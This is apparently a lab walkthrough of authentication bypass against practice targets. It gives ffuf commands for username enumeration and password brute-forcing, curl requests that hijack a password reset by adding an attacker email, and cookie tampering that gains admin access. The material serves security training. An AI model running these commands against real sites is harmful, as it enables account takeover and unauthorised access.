### *Username Enumeration*
Find a sign up/register page, register a user and take note of the response. Copy as a curl command in Burp suite. Use ffuf to enumerate usernames. 
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.207.177/customers/signup -mr "username already exists"
```

Create a list of usernames from the output. Copy as a curl command in Burp suite. Use ffuf to brute force each username with a list of passwords.
```
ffuf -w usernames.txt:W1,/opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.207.177/customers/login -fc 200
```
### *Password reset logic flaw*
This password reset POST request contains a vulnerability where the PHP [`$_REQUEST` variable](https://www.php.net/manual/en/reserved.variables.request.php) contains data from the query string and POST data.

This is a normal password reset POST request. The PHP code is checking for the correct email in the query parameter, and the correct email in the body.
```
curl 'http://10.10.204.130/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

Because there are no checks for the POST data, you can replace the email with a malicious one. 
```
curl 'http://10.10.204.130/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

This website will generate a support ticket for password resets, you would of found this by creating your own account and taking notes of the password reset logic. Now create a malicious account, and use the website's generated email address to issue a password reset for the victim from within your malicious account.
```
curl 'http://10.10.204.130/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```
### *Cookie tampering*
Change the values of cookies to arbitrary values, as an example, logging a user in, and becoming admin. A site will not have a `/cookie-test` page, try reaching protected pages with different cookie values, you can find protected pages as a public user not signed in, check for errors, redirects, etc...
```
┌─[]─[parrot@parrot]─[~]
└──╼ [★]$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.204.130/cookie-test
Logged In As A User

┌─[]─[parrot@parrot]─[~]
└──╼ [★]$ curl -H "Cookie: logged_in=true; admin=truee" http://10.10.204.130/cookie-test
Logged In As A User

┌─[]─[parrot@parrot]─[~]
└──╼ [★]$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.204.130/cookie-test
Logged In As An Admin
```

Some cookies will be stored as a hash, which is an irreversible, although they can be cracked using software such as https://crackstation.net.

|                     |                 |                                                                                                                                  |
| ------------------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **Original String** | **Hash Method** | **Output**                                                                                                                       |
| 1                   | md5             | c4ca4238a0b923820dcc509a6f75849b                                                                                                 |
| 1                   | sha-256         | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b                                                                 |
| 1                   | sha-512         | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
| 1                   | sha1            | 356a192b7913b04c54574d18c28d46e6395428ab                                                                                         |
